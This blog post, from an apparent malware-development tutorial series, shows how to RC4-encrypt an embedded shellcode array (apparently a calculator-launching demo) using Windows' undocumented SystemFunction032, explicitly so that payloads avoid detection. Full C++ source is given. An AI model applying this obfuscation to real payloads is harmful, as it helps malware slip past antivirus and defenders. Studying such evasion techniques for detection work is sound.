# https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-07/

<!DOCTYPE html><!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
--><html lang="en" class=" js "><body class="layout--single wide"><a href="https://buymeacoffee.com/ry0d4n" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: 41px !important;width: 174px !important;box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;-webkit-box-shadow: 0px 3px 2px 0px rgba(190, 190, 190, 0.5) !important;"></a>


  

  
    

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  



  <article class="page" itemscope="" itemtype="https://schema.org/CreativeWork">
    
    
    
    

    <div class="page__inner-wrap">
      
        
      

      <section class="page__content" itemprop="text">
        
          
        
        <h1 id="encryption-and-obfuscation">Encryption and obfuscation<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-07/#encryption-and-obfuscation" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>A very important part of each Malware Development process is the encryption and obfuscation, The more you have a stealthy encryption the  more you aren’t likely to be detected, So learning encryption techniques is a very important part of learning Malware Development.</p>

<p>Today we are going to combine encryption and obfuscation together, combining RC4 encryption technique and using Microsoft’s undocumented structures to achieve this encryption.</p>

<p>Let’s first talk a bit about Microsoft’s undocumented structures.</p>

<h1 id="undocumented-structures">Undocumented structures<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-07/#undocumented-structures" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Microsoft’s undocumented structures refer to data structures, functions, or behaviors within Windows operating systems that are not officially undocumented or supported by Microsoft. These undocumented features are not intended for public use and are typically not disclosed in official documentation or APIs. However, they may be discovered by reverse engineers or through experimentation.</p>

<p>Malware authors often use undocumented structures in Windows to hide their malicious activities and evade detection.</p>

<p>For example, the TDL (TDL-4 or <strong>Alureon</strong>) rootkit, which emerged around 2008, used various techniques to hide its presence on infected systems. It employed undocumented structures within the Windows kernel to intercept and modify system calls related to file I/O, process management, and network communications. By doing so, TDL was able to conceal its files and processes from both users and security software, making it extremely difficult to detect and remove.</p>

<p>Another example is the <strong>Stuxnet</strong> worm, which was discovered in 2010 and targeted industrial control systems, particularly those used in nuclear facilities. <strong>Stuxnet</strong> utilized multiple zero-day vulnerabilities and sophisticated techniques, including the exploitation of undocumented Windows structures, to infect systems and manipulate programmable logic controllers (PLCs) without detection. It employed rootkit-like functionality to hide its presence and evade detection by antivirus software.</p>

<p><strong>RC4 Encryption</strong></p>

<p>There is an undocumented WINAPI call <code class="language-plaintext highlighter-rouge">SystemFunction032</code>that actually is an implementation of RC4, we are going to use that call to encrypt (or decrypt) a payload that we designed.</p>

<p>The parameters of this function are from type <code class="language-plaintext highlighter-rouge">USTRING</code> , So before everything let’s define our structure that we are going o inherit from:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">USTRING</span><span class="p">{</span>
  <span class="n">DWORD</span> <span class="n">Length</span><span class="p">;</span>
  <span class="n">DWORD</span> <span class="n">MaxLength</span><span class="p">;</span>
  <span class="n">PVOID</span> <span class="n">pBuffer</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Next we are going to write the function prototype:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">fnSystemFunction032</span><span class="p">)(</span>

  <span class="k">struct</span> <span class="nc">USTRING</span><span class="o">*</span> <span class="n">Data</span><span class="p">,</span>
  <span class="k">struct</span> <span class="nc">USTRING</span><span class="o">*</span> <span class="n">Key</span>

  <span class="p">);</span> 
</code></pre></div></div>
<ul>
  <li><code class="language-plaintext highlighter-rouge">typedef</code>: This keyword is used to define a new type alias. In this case, it’s being used to create a new type alias for a function pointer.</li>
  <li><code class="language-plaintext highlighter-rouge">NTSTATUS</code>: This is a Windows-specific data type representing a status code, typically used to indicate the success or failure of a function call.</li>
  <li><code class="language-plaintext highlighter-rouge">WINAPI</code>: This is a macro defined in Windows headers, typically used to specify the calling convention for functions. It ensures that functions are appropriately called based on the platform’s calling conventions (e.g., <code class="language-plaintext highlighter-rouge">stdcall</code>).</li>
</ul>

<p>Again, all the information about this function and its parameters, return value and so on, are obtained through REVERSE ENGINEERING, and Microsoft hasn’t until now a clear documentation about it.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">NTSTATUS</span> <span class="n">STATUS</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="c1">// Data and Key</span>
  <span class="n">USTRING</span> <span class="n">Data</span><span class="p">;</span>
  <span class="n">USTRING</span> <span class="n">Key</span><span class="p">;</span>

  <span class="c1">// setting the values</span>

  <span class="n">Data</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="n">DataSize</span><span class="p">;</span>
  <span class="n">Data</span><span class="p">.</span><span class="n">MaxLength</span> <span class="o">=</span> <span class="n">DataSize</span><span class="p">;</span>
  <span class="n">Data</span><span class="p">.</span><span class="n">pBuffer</span> <span class="o">=</span> <span class="n">pData</span><span class="p">;</span>

  <span class="n">Key</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="n">Rc4KeySize</span><span class="p">,</span>
  <span class="n">Key</span><span class="p">.</span><span class="n">MaxLength</span> <span class="o">=</span> <span class="n">Rc4KeySize</span><span class="p">;</span>
  <span class="n">Key</span><span class="p">.</span><span class="n">pBuffer</span> <span class="o">=</span> <span class="n">pRc4Key</span><span class="p">;</span>
</code></pre></div></div>

<p>Now we are defining and setting the initial values of the two structures (Data and Key), (pData, pRc4Key, DataSize, Rc4KeySize) are passed as parameters to the wrapper function.</p>

<p>Then after we have prepared the parameters that’ll be passed to <code class="language-plaintext highlighter-rouge">Systemfunction032</code> we now need to call it to encrypt the Data variable with the Key value.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">fnSystemFunction032</span> <span class="n">SystemFunction032</span> <span class="o">=</span> <span class="p">(</span><span class="n">fnSystemFunction032</span><span class="p">)(</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"Advapi32.dll"</span><span class="p">),</span> <span class="s">"SystemFunction032"</span><span class="p">));</span>
</code></pre></div></div>

<p>As the function is defined inside <strong>Advapi32.dll</strong> we have used <code class="language-plaintext highlighter-rouge">GetProcAddress()</code> and  <code class="language-plaintext highlighter-rouge">LoadLibraryA()</code> to resolve it.</p>

<p>Then last thing is to initiate the encryption:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">((</span><span class="n">STATUS</span> <span class="o">=</span> <span class="n">SystemFunction032</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Key</span><span class="p">))</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"SystemFunction032 failed with error 0x%0.8x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>

    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>

  <span class="p">}</span>
</code></pre></div></div>

<h1 id="execution" class="active">Execution<a class="header-link" href="https://ry0dan.github.io/malware%20development/Malware-Development-Crafting-Digital-Chaos-07/#execution" title="Permalink"><span class="sr-only">Permalink</span><i class="fas fa-link"></i></a></h1>

<p>Before we execute let’s use Cyberchef and encrypt the payload with the same key we will be using in our code, So we can later compare it:</p>

<p><img src="https://ry0dan.github.io/assets/images/malware-development/7-0.png" alt="P1"></p>

<p>Then we break after the call and observe the shellcode address and compare the bytes we got:
<img src="https://ry0dan.github.io/assets/images/malware-development/7-1.png" alt="P2"></p>

<p>The full code:</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">fnSystemFunction032</span><span class="p">)(</span>

  <span class="k">struct</span> <span class="nc">USTRING</span><span class="o">*</span> <span class="n">Data</span><span class="p">,</span>
  <span class="k">struct</span> <span class="nc">USTRING</span><span class="o">*</span> <span class="n">Key</span>

  <span class="p">);</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">USTRING</span><span class="p">{</span>
  <span class="n">DWORD</span> <span class="n">Length</span><span class="p">;</span>
  <span class="n">DWORD</span> <span class="n">MaxLength</span><span class="p">;</span>
  <span class="n">PVOID</span> <span class="n">pBuffer</span><span class="p">;</span>
<span class="p">};</span>


<span class="n">BOOL</span> <span class="n">Rc4Enc</span><span class="p">(</span><span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">pRc4Key</span><span class="p">,</span> <span class="n">IN</span> <span class="n">PBYTE</span> <span class="n">pData</span><span class="p">,</span> <span class="n">IN</span> <span class="n">DWORD</span> <span class="n">Rc4KeySize</span><span class="p">,</span> <span class="n">IN</span> <span class="n">DWORD</span> <span class="n">DataSize</span><span class="p">)</span> <span class="p">{</span>


  <span class="n">NTSTATUS</span> <span class="n">STATUS</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="c1">// Data and Key</span>
  <span class="n">USTRING</span> <span class="n">Data</span><span class="p">;</span>
  <span class="n">USTRING</span> <span class="n">Key</span><span class="p">;</span>

  <span class="c1">// setting the values</span>

  <span class="n">Data</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="n">DataSize</span><span class="p">;</span>
  <span class="n">Data</span><span class="p">.</span><span class="n">MaxLength</span> <span class="o">=</span> <span class="n">DataSize</span><span class="p">;</span>
  <span class="n">Data</span><span class="p">.</span><span class="n">pBuffer</span> <span class="o">=</span> <span class="n">pData</span><span class="p">;</span>

  <span class="n">Key</span><span class="p">.</span><span class="n">Length</span> <span class="o">=</span> <span class="n">Rc4KeySize</span><span class="p">,</span>
  <span class="n">Key</span><span class="p">.</span><span class="n">MaxLength</span> <span class="o">=</span> <span class="n">Rc4KeySize</span><span class="p">;</span>
  <span class="n">Key</span><span class="p">.</span><span class="n">pBuffer</span> <span class="o">=</span> <span class="n">pRc4Key</span><span class="p">;</span>

  <span class="n">fnSystemFunction032</span> <span class="n">SystemFunction032</span> <span class="o">=</span> <span class="p">(</span><span class="n">fnSystemFunction032</span><span class="p">)(</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"Advapi32.dll"</span><span class="p">),</span> <span class="s">"SystemFunction032"</span><span class="p">));</span>

  <span class="k">if</span> <span class="p">((</span><span class="n">STATUS</span> <span class="o">=</span> <span class="n">SystemFunction032</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Key</span><span class="p">))</span> <span class="o">!=</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"SystemFunction032 failed with error 0x%0.8x"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>

    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>

  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"EncryptionDone</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
<span class="p">{</span>

  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span>
  <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span>
  <span class="mh">0x7E</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span>
  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xB7</span><span class="p">,</span> <span class="mh">0x2C</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xAD</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span>
  <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
  <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0xD7</span> <span class="p">};</span>

  
  <span class="n">BYTE</span> <span class="n">byteArray</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x33</span> <span class="p">};</span>
  <span class="n">PBYTE</span> <span class="n">key</span> <span class="o">=</span> <span class="n">byteArray</span><span class="p">;</span>
  

  <span class="k">if</span><span class="p">(</span><span class="n">Rc4Enc</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">key</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">)</span> <span class="o">==</span>  <span class="n">TRUE</span><span class="p">){</span>
    
    <span class="n">printf</span><span class="p">(</span><span class="s">"Encrypted successfully and here is the address to check: %p"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">);</span>
    <span class="n">getchar</span><span class="p">();</span>

  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Note: SystemFunction033 does the same RC4 encryption, I highly encourage you to explore it!.</li>
</ul>

<p>Thanks for reading.</p>

        
      </section>

      

      

      
  

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term...">
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    

    
  
  














  

</body></html>